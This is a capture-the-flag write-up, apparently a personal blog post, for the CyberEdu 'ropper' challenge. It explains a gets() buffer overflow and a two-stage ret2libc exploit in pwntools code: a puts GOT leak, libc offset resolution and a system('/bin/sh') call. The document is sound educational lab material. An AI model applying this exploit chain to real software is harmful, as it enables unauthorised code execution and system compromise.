+++
date = '2025-12-22'
draft = false
title = 'CyberEdu Ropper Writeup'
ShowToc = true
tags = ["CyberEdu", "pwn", "buffer-overflow", "Ret2libc"]
+++

## Challenge overview


Your message is at maximum two stages from the flag. Find the bugs in **[this binary](https://app.cyber-edu.co/challenges/55a544a0-7f21-11ea-8a5d-9b7c67823f77?tenant=cyberedu)** file and you will know what to do.

![challenge-screenshot](pic1.png#center)

As the name *ropper* suggests, and the buffer overflow shown in the image above, we're dealing with a ret2something here.

Let's take a look at the binary. We have a `main` and another secondary function being used here.

![challenge-screenshot](pic2.png#center)

`main` calls the second functions and passes, as arguments, the string getting printed and 0.

![challenge-screenshot](pic3.png#center)

The second function calls `gets(v3)`, then fills whatever's at address `unk_601080` with `v3`.

---

## Identifying the vulnerabilities

Should the `unk_601080` might be something important, we'll take a look at what we're overwriting. Seems like `.bss` data, and it also seems to be empty.

![challenge-screenshot](pic4.png#center)

But the `gets(v3)` in our function called by main, without a read amount, which means buffer overflow! We don't have a win function though. 

So classic `ret2libc`, we're going to make a payload that looks like so, to leak `puts`'s libc address:

```python
#padding
payload = b"A"*256
#rbp
payload += b"R" *8

main = p64(0x400679)
pop_rdi_ret = p64(0x400763)
ret = p64(0x4004c9)

puts_plt = p64(0x4004e0)

puts_got = p64(elf.got['puts'])

payload += pop_rdi_ret + puts_got +  puts_plt + main

p.recvuntil(b"?\n")
p.sendline(payload)

leak = p.recvline().strip()
addr = u64(leak.ljust(8, b"\x00"))
print(hex(addr))
```

Now, since this returns us to `main`, we can craft another payload, which will execute our `system`. 

```python
#local
puts_offset = 0x585a0
system_offset = 0x2b110
binsh_offset = 0x17fea4

libc = addr - puts_offset
system = p64(libc + system_offset)
binsh = p64(libc + binsh_offset)

payload = b"A"*256
#rbp
payload += b"R" *8

payload += pop_rdi_ret + binsh + ret + system 
p.recvuntil(b"?\n")
p.sendline(payload)

p.interactive()
```

![challenge-screenshot](pic8.png#center)

Of course, it works locally, but we most likely have to replace the offsets we found with the correct ones, based on the remote `glibc` version. As expected, we get an `EOF`, but we can take the leak from the remote binary and find the `glibc` version using `libc.blukat`. The version I found was `libc6_2.23-0ubuntu10_amd64`, and using its offsets, we get the flag!

```python
#2.23 amd64
puts_offset = 0x06f690
system_offset = 0x045390
binsh_offset = 0x18cd57
```

![challenge-screenshot](pic9.png#center)

---

As always, the full code can be found on my GitHub 
**[here](https://github.com/irinasusca/ctf-writeups/blob/main/cyberedu/ropper.py)**.
